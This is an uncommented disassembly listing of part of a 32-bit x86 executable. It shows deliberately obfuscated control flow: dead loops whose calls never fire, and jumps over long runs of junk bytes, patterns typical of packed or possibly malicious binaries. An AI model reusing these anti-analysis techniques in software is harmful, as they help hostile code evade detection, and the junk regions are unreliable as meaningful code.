  40b00c:	and    DWORD PTR ds:0x41aa3a,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41aa3a
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41aa3a,edi
  40b02a:	cmp    DWORD PTR ds:0x41aa3a,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41aa3a,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4233c3,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41231c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417d19,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x4122f8
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4233bf
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41aa46
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41503d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x7c]
  40b0b6:	dec    edx
  40b0b7:	ret    
  40b0b8:	mov    ecx,cs
  40b0ba:	aas    
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	stos   DWORD PTR es:[edi],eax
  40b0c2:	inc    esi
  40b0c3:	ins    BYTE PTR es:[edi],dx
  40b0c4:	aaa    
  40b0c5:	jp     0x40b0aa
  40b0c7:	fnstenv [edi]
  40b0c9:	xchg   edx,eax
  40b0ca:	sub    DWORD PTR [ebp-0x7c],edx
  40b0cd:	xor    DWORD PTR [edx],edi
  40b0cf:	cmc    
  40b0d0:	outs   dx,DWORD PTR ds:[esi]
  40b0d1:	jno    0x40b098
  40b0d3:	mov    ch,0x46
  40b0d5:	mov    dh,0xa0
  40b0d7:	mov    bh,0xa7
  40b0d9:	add    ebx,0x2929e3e8
  40b0df:	leave  
  40b0e0:	popf   
  40b0e1:	leave  
  40b0e2:	pop    esi
  40b0e3:	and    al,0x93
  40b0e5:	outs   dx,DWORD PTR ds:[esi]
  40b0e6:	add    dl,BYTE PTR [edx]
  40b0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0e9:	lods   eax,DWORD PTR ds:[esi]
  40b0ea:	sbb    DWORD PTR ds:[edx+0x3e],0xfa82654f
  40b0f2:	jge    0x40b0f2
  40b0f4:	xlat   BYTE PTR ds:[ebx]
  40b0f5:	es xor al,0xb7
  40b0f8:	std    
  40b0f9:	dec    esp
  40b0fa:	inc    ecx
  40b0fb:	sbb    DWORD PTR [ecx+ecx*2+0x46a21726],0x45e3e471
  40b106:	mov    edi,0x9583750f
  40b10b:	add    al,BYTE PTR [ecx]
  40b10d:	or     BYTE PTR [edi+eiz*8+0x2dcccdc6],0x39
  40b115:	cmp    ecx,DWORD PTR [eax+0x16543467]
  40b11b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b11c:	test   DWORD PTR ds:0xc84cf27b,esp
  40b122:	mov    cl,0x5
  40b124:	loope  0x40b189
  40b126:	adc    al,ch
  40b128:	add    al,0xcb
  40b12a:	ins    BYTE PTR es:[edi],dx
  40b12b:	loope  0x40b113
  40b12d:	loopne 0x40b11e
  40b12f:	repz (bad) [ecx]
  40b132:	xchg   ebp,eax
  40b133:	dec    eax
  40b134:	shl    BYTE PTR [ebp+0x53],cl
  40b137:	push   cs
  40b138:	popf   
  40b139:	cmp    dl,BYTE PTR [ecx]
  40b13b:	sub    BYTE PTR [ecx-0x6e929210],bl
  40b141:	and    edx,edx
  40b143:	out    dx,eax
  40b144:	pop    es
  40b145:	jb     0x40b0d0
  40b147:	rcl    BYTE PTR [edx],1
  40b149:	pop    es
  40b14a:	jmp    ebp
  40b14c:	xchg   edx,eax
  40b14d:	(bad)  
  40b14e:	sub    al,0x0
  40b150:	jnp    0x40b175
  40b152:	add    al,0xb2
  40b154:	or     ah,BYTE PTR fs:[ecx+ecx*4+0x285480cd]
  40b15c:	and    DWORD PTR [edi-0x4a99f74d],0xd2ea150b
  40b166:	out    0x67,al
  40b168:	pop    esp
  40b169:	push   eax
  40b16a:	or     al,0x65
  40b16c:	xor    eax,0x3fda5acc
  40b171:	adc    eax,0x32dd7c94
  40b176:	and    eax,0xb4f01d10
  40b17b:	jnp    0x40b101
  40b17d:	mov    al,ds:0xc3077290
  40b182:	(bad)  
  40b183:	sbb    eax,0xd7c9279d
  40b188:	mov    bh,0x89
  40b18a:	jne    0x40b184
  40b18c:	movzx  ecx,BYTE PTR ds:0x41aa3e
  40b193:	and    DWORD PTR ds:0x415045,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x2c
  40b1ab:	shl    dl,0x48
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b18b
  40b1b7:	aaa    
  40b1b8:	xchg   DWORD PTR [ebx],ecx
  40b1ba:	fsub   QWORD PTR [edi+0x29]
  40b1bd:	test   DWORD PTR [edx-0x2],ecx
  40b1c0:	jecxz  0x40b15b
  40b1c2:	mov    ?,WORD PTR ds:[eax-0x310cc2fe]
  40b1c9:	adc    eax,0xa82ac26f
  40b1ce:	xchg   edi,eax
  40b1cf:	mov    al,0xb6
  40b1d1:	pop    ebx
  40b1d2:	stos   BYTE PTR es:[edi],al
  40b1d3:	(bad)  [ecx+0x6c]
  40b1d6:	loop   0x40b1b3
  40b1d8:	fs shl ch,0xc9
  40b1dc:	sbb    ch,bh
  40b1de:	mov    bh,0xbf
  40b1e0:	sbb    BYTE PTR [esi-0x6fd6469f],bh
  40b1e6:	push   esi
  40b1e7:	jp     0x40b1b7
  40b1e9:	retf   0x5cc
  40b1ec:	daa    
  40b1ed:	pusha  
  40b1ee:	push   cs
  40b1ef:	je     0x40b235
  40b1f1:	cld    
  40b1f2:	push   edi
  40b1f3:	xor    eax,0xe659316c
  40b1f8:	fistp  DWORD PTR [ebx]
  40b1fa:	ins    BYTE PTR es:[edi],dx
  40b1fb:	jns    0x40b25f
  40b1fd:	push   0xbd2ab922
  40b202:	fstp   QWORD PTR [ecx-0x66128bc0]
  40b208:	pop    edi
  40b209:	scas   eax,DWORD PTR es:[edi]
  40b20a:	inc    eax
  40b20b:	lods   eax,DWORD PTR ds:[esi]
  40b20c:	sar    eax,0x81
  40b20f:	lods   eax,DWORD PTR ds:[esi]
  40b210:	mov    dh,0xe3
  40b212:	aas    
  40b213:	jle    0x40b1ba
  40b215:	add    eax,0xfffffffc
  40b218:	std    
  40b219:	or     eax,esi
  40b21b:	and    ebx,DWORD PTR [esi-0x6]
  40b21e:	fwait
  40b21f:	in     eax,dx
  40b220:	xchg   esi,ecx
  40b222:	cmc    
  40b223:	pop    edi
  40b224:	div    eax
  40b226:	lock mov fs,WORD PTR [edi-0x2e005c9d]
  40b22d:	out    dx,eax
  40b22e:	dec    edi
  40b22f:	retf   
  40b230:	adc    al,0x2f
  40b232:	mov    DWORD PTR [eax-0x70bbe4ed],ebx
  40b238:	push   ss
  40b239:	add    BYTE PTR [edi+edi*8+0x7e1cf015],dl
  40b240:	stos   DWORD PTR es:[edi],eax
  40b241:	mov    cs,WORD PTR [edi-0x5f4e8d74]
  40b247:	fld    TBYTE PTR [edi+esi*8]
  40b24a:	sahf   
  40b24b:	xchg   ebx,eax
  40b24c:	pop    ebp
  40b24d:	jl     0x40b1fe
  40b24f:	aas    
  40b250:	scas   eax,DWORD PTR es:[edi]
  40b251:	xchg   esi,eax
  40b252:	shr    BYTE PTR [edi+0x11c86c87],1
  40b258:	js     0x40b281
  40b25a:	sub    BYTE PTR [ecx-0x14fb4526],cl
  40b260:	in     al,dx
  40b261:	ret    
  40b262:	xchg   BYTE PTR [eax+0x3b850abd],bl
  40b268:	lock jge 0x40b209
  40b26b:	in     al,0x5
  40b26d:	cwde   
  40b26e:	xchg   DWORD PTR [ebx-0x35],edx
  40b271:	outs   dx,DWORD PTR ds:[esi]
  40b272:	jge    0x40b2ba
  40b274:	ror    DWORD PTR [ecx+0x5ec6e59b],0x96
  40b27b:	fidivr DWORD PTR [edx+eax*2-0x7e17b275]
  40b282:	sub    eax,0x41502d
  40b287:	dec    edx
  40b288:	stos   BYTE PTR es:[edi],al
  40b289:	inc    ecx
  40b28a:	add    BYTE PTR [ebx],dh
  40b28c:	enter  0xff33,0x9
  40b290:	cmp    eax,0x4122fc
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415035
  40b2aa:	xor    DWORD PTR ds:0x4122e4,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4233bf,0x4122e8
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4233bf,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0x2b19a5cd],edx
  40b2e2:	push   ss
  40b2e3:	mov    ds:0x7e3c594d,eax
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2de
  40b2ee:	int3   
  40b2ef:	push   es
  40b2f0:	sub    bh,BYTE PTR [edx+0x33]
  40b2f3:	xlat   BYTE PTR ds:[ebx]
  40b2f4:	or     dl,ah
  40b2f6:	icebp  
  40b2f7:	dec    eax
  40b2f8:	push   esp
  40b2f9:	jp     0x40b34a
  40b2fb:	js     0x40b2d9
  40b2fd:	mov    ebx,0xcfd9158b
  40b302:	jecxz  0x40b359
  40b304:	mov    bh,0x17
  40b306:	ins    DWORD PTR es:[edi],dx
  40b307:	shl    DWORD PTR [esi+0x3f],cl
  40b30a:	mov    eax,ds:0xbad93799
  40b30f:	inc    ebx
  40b310:	mov    dh,0xdc
  40b312:	pop    ecx
  40b313:	pusha  
  40b314:	js     0x40b323
  40b316:	pop    ds
  40b317:	sub    eax,0x225fbc24
  40b31c:	adc    eax,0x9881ef51
  40b321:	cmp    al,0x44
  40b323:	in     al,dx
  40b324:	int    0xa8
  40b326:	xchg   edx,eax
  40b327:	jl     0x40b31a
  40b329:	ret    
  40b32a:	clc    
  40b32b:	es inc eax
  40b32d:	lds    ebx,FWORD PTR [esi-0x6a3a9cdf]
  40b333:	cld    
  40b334:	jno    0x40b2e6
  40b336:	(bad)  
  40b337:	xor    esp,DWORD PTR ds:[edx]
  40b33a:	push   ds
  40b33b:	dec    eax
  40b33c:	sub    BYTE PTR [edi+0x70cc308e],dl
  40b342:	or     BYTE PTR ds:0xad827b5a,bh
  40b348:	mov    edx,cs
  40b34a:	inc    ecx
  40b34b:	fcomp  QWORD PTR [eax-0x7a]
  40b34e:	xchg   edi,eax
  40b34f:	(bad)  
  40b351:	jecxz  0x40b34b
  40b353:	fwait
  40b354:	and    BYTE PTR [ecx-0x7f],al
  40b357:	sbb    DWORD PTR [ebx],0xde18d2ac
  40b35d:	rcr    DWORD PTR [ecx+ecx*4],cl
  40b360:	inc    BYTE PTR [esi+0xfa2d48a]
  40b366:	add    BYTE PTR [eax-0xe],ch
  40b369:	mov    ecx,0x4da68fac
  40b36e:	iret   
  40b36f:	shufps xmm3,XMMWORD PTR [edi-0xaaeb74f],0x38
  40b377:	cmc    
  40b378:	push   ss
  40b379:	call   0x28aa:0x4db12eda
  40b380:	leave  
  40b381:	bound  edx,QWORD PTR [esi-0x34c300bf]
  40b387:	repnz mov esi,DWORD PTR ds:0xf3ce2192
  40b38e:	inc    ebx
  40b38f:	imul   edx,DWORD PTR [ebx-0x2dac9e2],0xb9e906ac
  40b399:	adc    al,0x5e
  40b39b:	arpl   di,bp
  40b39d:	sub    DWORD PTR [ebx-0x40],ebx
  40b3a0:	sbb    DWORD PTR [edi+0x5179fc21],edx
  40b3a6:	ret    0xab40
  40b3a9:	mov    esp,0x26de43a4
  40b3ae:	icebp  
  40b3af:	sbb    ebx,DWORD PTR [ebx+0x1c]
  40b3b2:	out    0x6e,al
  40b3b4:	bnd jne 0x40b94a
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41aa52,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41230c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41230c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41230c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41230c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41230c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415031,0x17
  40b41d:	cmp    DWORD PTR ds:0x415031,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415031,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415031
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415031,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4233d3,0x0
  40b45f:	mov    eax,ds:0x4233d3
  40b464:	inc    eax
  40b465:	mov    ds:0x4233d3,eax
  40b46a:	cmp    DWORD PTR ds:0x4233d3,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41abcb
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4233d3,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4233d3
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4233d3,eax
  40b4a0:	cmp    DWORD PTR ds:0x4233d3,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41aa3a,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41aa3a,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41aa3a,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41aa3a
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41aa3a,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41aa46,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4233c7,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	jmp    0x40b55d
  40b53b:	retf   
  40b53c:	xchg   cx,ax
  40b53e:	cmp    eax,0x7eb67e7e
  40b543:	jle    0x40b5c3
  40b545:	loop   0x40b4cf
  40b547:	push   eax
  40b548:	xor    al,0x71
  40b54a:	sub    eax,0x703d3a70
  40b54f:	pop    eax
  40b550:	dec    esp
  40b551:	cmp    bl,BYTE PTR [ecx+0x70]
  40b554:	add    BYTE PTR [ebx+0x42],dl
  40b557:	add    eax,0xe04e1cee
  40b55c:	ins    BYTE PTR es:[edi],dx
  40b55d:	stc    
  40b55e:	mov    ds:0xe6d7f2ed,al
  40b563:	inc    esp
  40b564:	mov    eax,0xf9f090fd
  40b569:	fs push ecx
  40b56b:	mov    DWORD PTR [esi+ebx*4+0x53],esp
  40b56f:	sub    BYTE PTR [ebx+0x22],0xf5
  40b573:	enter  0x2a9e,0x21
  40b577:	dec    edx
  40b578:	jo     0x40b570
  40b57a:	js     0x40b4fd
  40b57c:	sar    DWORD PTR [eax],cl
  40b57e:	mov    ebp,0x7fcef33d
  40b583:	mov    al,ds:0x755175aa
  40b588:	pop    es
  40b589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b58a:	sub    BYTE PTR [ecx+0x16190e1d],dh
  40b590:	ss icebp 
  40b592:	mov    ecx,0x56f9486a
  40b597:	fld1   
  40b599:	nop
  40b59a:	fiadd  DWORD PTR [ecx+0x31321c2e]
  40b5a0:	mov    eax,0xdcea595c
  40b5a5:	shl    BYTE PTR [esi],1
  40b5a7:	or     esp,ebx
  40b5a9:	inc    edi
  40b5aa:	inc    eax
  40b5ab:	fcom   QWORD PTR ds:[ebx+0x7bae2ccd]
  40b5b2:	mov    edx,0xb3edb0c6
  40b5b7:	add    DWORD PTR [edx],0xffffffda
  40b5ba:	add    cl,BYTE PTR [edi-0x6c]
  40b5bd:	int3   
  40b5be:	arpl   WORD PTR [ebx+0x51],di
  40b5c1:	push   ds
  40b5c2:	cmp    ebp,DWORD PTR [esi+0x6633e4]
  40b5c8:	icebp  
  40b5c9:	xor    DWORD PTR [ecx+edi*8-0x30ef46d0],ebp
  40b5d0:	lds    esp,FWORD PTR [edi+0x3a]
  40b5d3:	pusha  
  40b5d4:	mov    ch,0xd0
  40b5d6:	clc    
  40b5d7:	add    DWORD PTR [ebp-0x14],edi
  40b5da:	jb     0x40b596
  40b5dc:	cmp    eax,0xe9bafa65
  40b5e1:	dec    ecx
  40b5e2:	pop    esi
  40b5e3:	test   DWORD PTR [ecx+ebx*1-0xe360e02],esi
  40b5ea:	jns    0x40b5c0
  40b5ec:	xor    DWORD PTR [esi+ecx*2-0x7b],ecx
  40b5f0:	xor    al,0x73
  40b5f2:	(bad)  
  40b5f3:	aam    0xe2
  40b5f5:	xchg   BYTE PTR [bx+si-0x2040],bl
  40b5fa:	dec    esi
  40b5fb:	and    BYTE PTR [edx+ebx*2],cl
  40b5fe:	ret    0x8ca6
  40b601:	js     0x40b651
  40b603:	fldlg2 
  40b605:	test   al,0x97
  40b607:	mov    ebp,ebp
  40b609:	cmp    al,0x1b
  40b60b:	mov    bh,BYTE PTR [edi+ecx*1+0x54284]
  40b612:	add    BYTE PTR [ecx+0x4150451d],al
  40b618:	add    al,bh
  40b61a:	and    al,BYTE PTR [ecx+0x0]
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x13,al
  40b632:	dec    ecx
  40b633:	data16 sub al,0xe9
  40b636:	xor    bh,BYTE PTR [esi+0x7e]
  40b639:	mov    dh,0x7e
  40b63b:	jle    0x40b6bb
  40b63d:	jmp    0x40b6b7
  40b63f:	push   ebx
  40b640:	cld    
  40b641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b642:	(bad)  
  40b643:	test   al,0x26
  40b645:	and    al,0xa4
  40b647:	jo     0x40b60a
  40b649:	into   
  40b64a:	js     0x40b636
  40b64c:	jbe    0x40b67e
  40b64e:	push   eax
  40b64f:	in     al,dx
  40b650:	popa   
  40b651:	loopne 0x40b5ea
  40b653:	mov    ecx,0xed530267
  40b658:	sub    BYTE PTR [ebx+0x7c],bh
  40b65b:	daa    
  40b65c:	inc    esp
  40b65d:	pop    ecx
  40b65e:	pop    ecx
  40b65f:	add    dh,BYTE PTR [ebp+edx*4-0x5a]
  40b663:	sar    DWORD PTR [eax],1
  40b665:	jae    0x40b665
  40b667:	cmp    edx,eax
  40b669:	pop    ds
  40b66a:	aam    0xf8
  40b66c:	ins    DWORD PTR es:[edi],dx
  40b66d:	(bad)  
  40b66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b66f:	lods   al,BYTE PTR ds:[esi]
  40b670:	shr    BYTE PTR [ecx-0x70],cl
  40b673:	dec    edi
  40b674:	mov    BYTE PTR ss:[edi-0x8],dh
  40b678:	inc    ebp
  40b679:	sahf   
  40b67a:	jo     0x40b64b
  40b67c:	xchg   esp,eax
  40b67d:	sub    al,0x5
  40b67f:	popf   
  40b680:	in     eax,dx
  40b681:	sbb    al,0x83
  40b683:	xor    dl,BYTE PTR ds:[esi-0x645e274]
  40b68a:	into   
  40b68b:	popa   
  40b68c:	jg     0x40b6cf
  40b68e:	mov    al,BYTE PTR [ecx-0x6bdeaf6a]
  40b694:	dec    edi
  40b695:	jnp    0x40b704
  40b697:	or     ebx,DWORD PTR [ecx]
  40b699:	sbb    bl,BYTE PTR [esi+ecx*4]
  40b69c:	retf   0x8361
  40b69f:	cwde   
  40b6a0:	lods   eax,DWORD PTR ds:[esi]
  40b6a1:	pusha  
  40b6a2:	cs retf 
  40b6a4:	out    dx,al
  40b6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a6:	jmp    0xf792142f
  40b6ab:	jbe    0x40b6f0
  40b6ad:	push   ecx
  40b6ae:	jno    0x40b670
  40b6b0:	daa    
  40b6b1:	or     edi,edx
  40b6b3:	(bad)  
  40b6b4:	sets   BYTE PTR [edi+0x37]
  40b6b8:	shr    BYTE PTR [eax+edx*8-0x10],cl
  40b6bc:	das    
  40b6bd:	ss jo  0x40b6ae
  40b6c0:	mov    bl,0x2e
  40b6c2:	push   es
  40b6c3:	xor    eax,0x127986ad
  40b6c8:	pop    esp
  40b6c9:	inc    edi
  40b6ca:	lock inc ebx
  40b6cc:	test   al,0x5e
  40b6ce:	cli    
  40b6cf:	iret   
  40b6d0:	pop    DWORD PTR [ebp+0x7caf7640]
  40b6d6:	inc    eax
  40b6d7:	mov    ah,0x8e
  40b6d9:	adc    dh,BYTE PTR [ebp+0x24addecf]
  40b6df:	daa    
  40b6e0:	push   0xffffffc8
  40b6e2:	sub    eax,0xe8875eb
  40b6e7:	cmp    BYTE PTR [ebx+0x22adbe05],cl
  40b6ed:	inc    edx
  40b6ee:	mov    BYTE PTR [ecx-0x71e00099],dl
  40b6f4:	div    BYTE PTR [ecx+esi*2+0x6443fa35]
  40b6fb:	or     eax,0xd2e19cee
  40b700:	clc    
  40b701:	test   DWORD PTR [edi+0x7f],ecx
  40b704:	pop    ebx
  40b705:	push   DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41aa4e,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412300
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4233cb,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415041,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x4122f4,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417d19,0x0
  40b756:	mov    eax,ds:0x417d19
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417d19,eax
  40b761:	cmp    DWORD PTR ds:0x417d19,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415045
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415041
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41ac6d
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417d19,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417d1d
  40b7b2:	sbb    DWORD PTR ds:0x41230c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412320
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417d7a
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4233c7,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x4122ec,0x415031
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417d29,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417d29,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417d29,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417d29,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417d29
  40b835:	dec    eax
  40b836:	mov    ds:0x417d29,eax
  40b83b:	mov    eax,ds:0x417d29
  40b840:	dec    eax
  40b841:	mov    ds:0x417d29,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xba7323e6
  40b867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b868:	xor    BYTE PTR [ecx],ah
  40b86a:	xor    edi,DWORD PTR [esi+0x7e]
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	test   DWORD PTR [ecx-0xb],eax
  40b874:	inc    eax
  40b875:	fdiv   DWORD PTR [edi-0x6f]
  40b878:	daa    
  40b879:	push   0xc72f107d
  40b87e:	adc    dl,BYTE PTR [edx-0x35]
  40b881:	mov    ecx,0xd558ab5a
  40b886:	scas   al,BYTE PTR es:[edi]
  40b887:	jp     0x40b8d0
  40b889:	adc    eax,0xbd0b24ca
  40b88e:	sbb    BYTE PTR [edi+0x68],al
  40b891:	dec    ecx
  40b892:	mov    ebp,0xad442b6c
  40b897:	mov    dh,ah
  40b899:	not    DWORD PTR [ebx]
  40b89b:	add    eax,0x697e6f08
  40b8a0:	adc    al,bh
  40b8a2:	mov    ds:0xff75f7ed,eax
  40b8a7:	mov    edi,0xe71a7a3a
  40b8ac:	imul   esi,DWORD PTR [edx-0x3c],0xd070b273
  40b8b3:	xor    ecx,DWORD PTR [ebx+ecx*4+0x3b11e41a]
  40b8ba:	das    
  40b8bb:	popf   
  40b8bc:	dec    edx
  40b8bd:	jl     0x40b8f6
  40b8bf:	jecxz  0x40b8bd
  40b8c1:	test   eax,0x27e10735
  40b8c6:	add    DWORD PTR [ebp+0x5c2d75f9],ecx
  40b8cc:	addr16 jbe 0x40b88d
  40b8cf:	ja     0x40b90f
  40b8d1:	cmp    ecx,esp
  40b8d3:	fs hlt 
  40b8d5:	push   es
  40b8d6:	push   edx
  40b8d7:	xchg   esp,eax
  40b8d8:	arpl   WORD PTR [ebp-0x7b],sp
  40b8db:	push   eax
  40b8dc:	jne    0x40b8ea
  40b8de:	jae    0x40b945
